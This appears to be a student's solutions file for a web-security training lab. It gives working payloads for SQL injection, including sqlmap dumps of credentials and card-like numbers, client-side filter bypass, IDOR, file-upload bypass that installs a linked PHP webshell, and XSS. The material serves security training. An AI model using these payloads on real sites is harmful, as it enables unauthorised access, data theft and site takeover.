----------------------------------
# SQL Injection

## Authentication Bypass Variant 1
### query:
SELECT * FROM users WHERE username='admin' AND password='pass'

### task:
You know how SQL is used to create login pages. Use that knowledge and try to figure out a way to login without any credentials. 

### payload:
*username*:admin

*password*:pass' OR 1=1 --+

**NOTE:** + is similar to space in URL encoding




## Authentication Bypass Variant 2
### query:
SELECT * FROM users WHERE username='admin' AND password='1a1dc91c907325c69271ddf0c944bc72'

### task:
You already know how to do a basic authentication bypass. Now try to do this one with a slight twist.

### payload:
*username*:admin' OR 1=1 -- 

*password*:123



## GET Based SQL Injection in URL Variant 1
### query:
http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-1/details.php?house=hufflepuff

### task:
Your task is to fetch all the usernames and passwords from the database of the website below.

### payload:
http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-1/details.php?house=hufflepuff' UNION SELECT username,password FROM users --+



## GET Based SQL Injection in URL Variant 2
### query:
http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1

### task:
Your task is to fetch all the usernames and passwords from the database of the website below.

### payload:
*direct method by guessing*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT username,NULL,NULL,password FROM users --+



*another appraoch*

*getting database name first*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT database(),version(),NULL,NULL --+ 

database-->SQL_Injection_V4
version-->5.7.29-0ubuntu0.18.04.1

*getting table names from database*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_type = 'base table' --+

OR

python sqlmap.py -u http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 -p category --tables

tables-->
bank_details	

movies 			

users

*getting column names from 'users' table*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name = 'users' --+

OR

python sqlmap.py -u http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 -p category --columns -T users



columns names-->
id 			
username 			
password

*getting username and password from 'users' table*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT username,password,NULL,NULL FROM users --+

OR

python sqlmap.py -u http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 -p category --dump -T users

username 	password

qwerty123 	keypad 

123456789 	login 	

batman 	joker 		

superman 	kryptonite


## GET Based SQL Injection in URL Variant 3
### query:
http://13.127.82.143/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=4

### task:
Your task is to fetch all the credit card numbers from the database of the website below.

### payload:

*apply similiar steps as Variant 2 to get database name,table name,column name and finally to get credit card numbers*

http://13.127.82.143/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=4) UNION SELECT NULL,id,card_number,NULL FROM users_credit_cards --+

1, 8146 5302 1546 7621

2, 4694 6630 2754 6708

3, 6194 6630 2454 6301

4, 5694 7680 6474 2353

5, 5137 6681 6694 1681


## Post Based SQL Injection Variant 2
### query:
SELECT * FROM hotels WHERE city='Delhi''

### task:
You have valid credentials for this login page (Username: test2@test.com; Password: pass). Your task is to intercept the POST requests and try performing SQL injection manually and by using sqlmap.

### payload:
' OR 1=1--+

SELECT * FROM hotels WHERE city=Delhi' ORDER BY 1,2,3,4,5,6,7,8,9--+'

SELECT * FROM hotels WHERE city=Delhi' UNION SELECT 1,2,3,4,5,6,7--+'

SELECT * FROM hotels WHERE city=Delhi' UNION SELECT 1,database(),3,4,version(),6,7--+'

database-->SQL_Injection_V7
version-->5.7.29-0ubuntu0.18.04.1

SELECT * FROM hotels WHERE city='Delhi' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,version(),6,7 FROM information_schema.tables WHERE table_type='BASE TABLE'--+'

tables-->hotels,users

SELECT * FROM hotels WHERE city='Delhi' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,version(),6,7 FROM information_schema.columns WHERE table_name='users'--+'

columns-->id,username,password

SELECT * FROM hotels WHERE city='Delhi' UNION SELECT 1,GROUP_CONCAT(id),3,4,GROUP_CONCAT(username),GROUP_CONCAT(password),7 FROM users--+'

id-->1,2

username-->test@test.com,test2@test.com 

password-->pass,1a1dc91c907325c69271ddf0c944bc72

*second approach*

intercept POST request in burp suite copy the request in notepad and name it post_sql.txt save it in same directory as sqlmap

(searching for database name)

python sqlmap.py -r post_sql.txt --dbs

(searching for table names)

python sqlmap.py -r post_sql.txt -D SQL_Injection_V7 --tables

(searching for columns names)

python sqlmap.py -r post_sql.txt -D SQL_Injection_V7 -T users --columns

(getting data from columns)

python sqlmap.py -r post_sql.txt -D SQL_Injection_V7 -T users -C id,username,password --dump

## Post Based SQL Injection Variant 3
### query:
sign=Capricorn

### task:
You have valid credentials for this login page (Username: test2@test.com; Password: pass). Your task is to intercept the POST requests and try performing SQL injection manually and by using sqlmap.

copy paste the intercepted request into file called post_sql.txt 


python sqlmap.py -r post_sql.txt --dbs

python sqlmap.py -r post_sql.txt -D SQL_Injection_V8 --tables

python sqlmap.py -r post_sql.txt -D SQL_Injection_V8 -T users --columns

 python sqlmap.py -r post_sql.txt -D SQL_Injection_V8 -T users -C id,username,password --dump

 

----------------------------------
# Bypassing Client Side Filters

## Client Side Validation Bypass Variant 1
### query:
email=john456%40gmail.com&password=123&fname=john&lname=john&terms=true

### task:
See how many client side filters you can bypass in the form below. 

### payload:
email=john456&password=123&fname=john&lname=john


## Client Side Validation Bypass Variant 2
### query:
price=3000&discount=300&balance=1000

### task:
Your task is to buy the headphones with the balance you have in your wallet.

### payload:

*discount parameter: is vulnerable as it is not validated on server side other two paratmeters are validated at server side*

price=3000&discount=2500&balance=1000


## Client Side Validation Bypass Variant 3
### query:
bprice=1000&toll=200&balance=500

### task:
See if you can schedule the ride without adding money to your wallet by bypassing any of the client side filters.

### payload:
*toll parameter: is vulnerable as it is not validated on server side other two paratmeters are validated at server side*

bprice=1000&toll=-500&balance=500


--------------------------------------------
# IDOR and Rate-limiting issues


## GET Based IDOR in URL Variant 1

### query:
http://13.233.245.52/Insecure-Direct-Object-Reference/GET-Based-IDOR-in-URL-Variant-1/bill.php?user_id=1438

### task:
Check if there's an IDOR vulnerability in the website below. If there is, find out how much user data can a hacker steal with it.

### payload:
*user_id parameter is vulnerable*
bill.php?user_id=1439


## Post Based IDOR Variant 1

### query:
phone_num=%2B91-9876543210

### task:
You were hired as a security expert by an organisation and you found the phone number of an important employee through social hacking. You also found out he was registered on this same website as you. Now use his number (+91-6842097531) and see if you can get his call details.

### payload:
phone_num=%2B91-6842097531

## GET Based IDOR in URL Variant 2

###query:
http://13.233.245.52/Insecure-Direct-Object-Reference/GET-Based-IDOR-in-URL-Variant-2/delete-post.php?post_id=931642

### task:
See if you can delete the posts of other users, apart from yours.

### payload:
*post_id is vulnerable paramter here*
*each users id is attached to thier name*

/delete-post.php?post_id=931642

>eg: Bulla928451
>name: Bulla
>id: 928451

*to delete this users comment*

/delete-post.php?post_id=928451

## Post Based IDOR in URL Variant 2

### query:
emp=EMP9D

### task:
See if you can tamper with the Employee ID and extract salary details of other employees working at ABC Pvt. Ltd.

### payload:
*burte force '9D' parameter with burp suite intruder*

>eg:
>emp=EMP6Y
>emp=EMP3C


## Download based IDOR

### query:
/Download-based/statement.php?accno=4001012392389

### task:
See if you can download the account statement for any other account numbers, other than yours.

### payload:
*acc no parameter is vulnerable increase the acc no by 1*

>ie:
accno=4001012392390


## Rate Limiting Flaws Variant 2

### query:
email=asd%40daa.com&username=asda&password=123


### task:
See if the website has the Rate Limiting Flaw vulnerability and if you can exploit it to create accounts for 10 users. Do not do it manually, use Burp Suite to exploit. 

### payload:
*all there parameters are vulnerable to rate limiting flaw*
*select all three payloads and using burp-suite do PitchFork attack uisng username,password,email list*


## Server Side Attack Variant 1

### query:
*the uplaod options allows to uploads file to server and afteruplaoding it allows to download*

### task:

Figure out how much damage can a hacker do using the file upload vulnerability in the web page below.

### payload:

*the upload options allow to upload file with any-type*

*https://raw.githubusercontent.com/tennc/webshell/master/php/b374k/mini_b374k copy the shell from here and save file as .php and uplaod the shell and then execute it*


## Server Side Attack Variant 2

### query:
Content-Disposition: form-data; name="tenth"; filename="hacked.pdf"
Content-Type: application/pdf



### task:

Figure out how much damage can a hacker do using the file upload vulnerability in the web page below.

### payload:

*sience they are asking to uplaod php file(other file type is not being uploaded) there is client side check on file type*

*we save the shell https://raw.githubusercontent.com/tennc/webshell/master/php/b374k/mini_b374k as .pdf and upload it, meanwhile intercept it with burp-suite and chnage the filetype to .php and forward the request.*

OR 

this is the query for pdf file:

>Content-Disposition: form-data; name="tenth"; filename="hacked.pdf"
>Content-Type: application/pdf

this is the query for non-pdf file:

>Content-Disposition: form-data; name="tenth"; filename="hacked.php"
>Content-Type: application/octet-stream

*you can also play with 'Content-Type' header just change it to application/pdf*


## Client Side Attack Variant 1

### query:
Content-Disposition: form-data; name="image"; filename="hacked.jpeg"
Content-Type: image/jpeg

### task:
Figure out how much damage can a hacker do using the file upload vulnerability in the web page below.

### paylaod:
*any file other then gif,jpeg,png are not even sent to burp-suite they are checked at client-side and rejected there only*

*so we need to first upload shell as .jpeg and in burp-suite we can change file-type to .php*

>Content-Disposition: form-data; name="image"; filename="hacked.php"
>Content-Type: image/jpeg

*but the file-type is cheched even at server side so maybe we can upload .html file*

>Content-Disposition: form-data; name="image"; filename="helloworld.html"
>Content-Type: image/jpeg

*.html file is accpeted by server means they are only checking for .php file, hene our html file is uploaded, now we can carry out any client side attack like phising*


## Server Side Attack Variant 3

### query:
Content-Disposition: form-data; name="dob"; filename="4555v2.pdf"
Content-Type: application/pdf

### task:
See if you can upload a PHP file by exploiting the File Upload vulnerability in the website below.

### payload:

for pdf file
>Content-Disposition: form-data; name="dob"; filename="4555v2.pdf"
>Content-Type: application/pdf

for non-pdf file

>Content-Disposition: form-data; name="residence"; filename="shell.php"
>Content-Type: application/octet-stream

*even after changing the 'Content-Type' to pdf file is checked at server side so we use shell.php%00.pdf -->anything after %00 is disregarded in older version of php and hence the file will be saved as shell.php*


for %00 pdf file

>Content-Disposition: form-data; name="nationality"; filename="shell3.php%00.pdf"
>Content-Type: application/pdf

*here it is accepting this .php%00 file as .pdf*




## Client Side Attack Variant 2

### query:
Content-Disposition: form-data; name="adhaar"; filename="xyz.pdf"
Content-Type: application/pdf

### task:
Figure out how much damage can a hacker do using the file upload vulnerability in the web page below.

### payload:
*Although it is a blacklist filter php,html,etc are not allowed this is checked at client side as the request is not even sent to burp-suite for blacklisted file type*

*here they are accepting pdf file,we will craft a .html file with .pdf as extension just to bypass the client side filter and at burp-suite we will modify the file name back to original (.html)*

>Content-Disposition: form-data; name="adhaar"; filename="phis.html.pdf"
>Content-Type: application/pdf



## Server Side Attack - Case Study

### query:
Content-Disposition: form-data; name="report"; filename="shell4.php.ppt"
Content-Type: application/vnd.ms-powerpoint

### task:
Figure out how much damage can a hacker do using the file upload vulnerability in the web page below.

### payload:
*Although it is a blacklist filter and a lot of malicious types are not allowed, an attacker can still upload malicious php files with uncommon extensions like php4 php3 etc*

*create a payload with extension .php.ppt and intercept this request with burpsuite and rename extension to .php4 and till will bypass server side filter*

>Content-Disposition: form-data; name="report"; filename="shell4.php4"
>Content-Type: application/vnd.ms-powerpoint


## Temporary XSS Variant 1

### query:
http://15.206.123.23/Cross-Site-Scripting/Temporary-XSS-Variant-1/hello.php?user_name=john

### task:
See if you can use the input field to cause harm to the user of this website.

### payload:
<p>Hi john</p>
*as our input is closed in '<p>' tags we can esacpe this easily*

http://15.206.123.23/Cross-Site-Scripting/Temporary-XSS-Variant-1/hello.php?user_name=john</p><script>alert(1)</script>


## Temporary XSS Variant 2

### query:
http://15.206.123.23/Cross-Site-Scripting/Temporary-XSS-Variant-2/xss/testing

### task:
See if you can use your knowledge of JavaScript to cause harm to the user of this website.

### payload:
*'testing' in the query is the parameter being displayed*
*as they are filtering <script> tags we are not able to write simply <script>alert(1)</script>script>*

*in this conditons we can use <img src='x' onerror=alert(1)> or <svg onload=alert(1)>*

http://15.206.123.23/Cross-Site-Scripting/Temporary-XSS-Variant-2/xss/testing <img src='x' onerror=alert(1)>


## Temporary XSS Variant 3

### query:
http://15.206.123.23/Cross-Site-Scripting/Temporary-XSS-Variant-3/error.php?error_txt=Incorrect username and password

### task:
See if you can inject HTML/JS and generate 'xssed' alert pop up.

### payload:
*'error_txt=Incorrect username and password' this text is being displayed on error.php page we can alter with this text to execute JS*

<a href="/Cross-Site-Scripting/Temporary-XSS-Variant-3"><input
class="btn btn-block" type="button" value="Incorrect username and password"></a>

*as it is enclosed value parameter of <a> tag we need to escape this first as our
	<script> tag will be displayed as tag it will not be executed in browser*

http://15.206.123.23/Cross-Site-Scripting/Temporary-XSS-Variant-3/error.php?error_txt=Incorrect username and password "></a>
<script>alert('xssed')</script>


## Temporary XSS Variant 4

### query:
<iframe id="frame" src="https://yale-lily.github.io/public/adamzucker.pdf" name="frame"></iframe>

### task:
See if you can bypass protective filters and generate alert pop up.

### payload:
*user-input: https://yale-lily.github.io/public/adamzucker.pdf"*

*query formed*
<iframe id="frame" src="https://yale-lily.github.io/public/adamzucker.pdf" name="frame"></iframe>

*user-input: https://yale-lily.github.io/public/adamzucker.pdf" onload=alert(1) *

*query formed*
 <iframe id="frame" src="https://yale-lily.github.io/public/adamzucker.pdf" onload=alert(1) " name="frame"></iframe>

*as " after .pdf is escaping the src paramter and onload event lister waits the pdf to be loaded then generates alert*











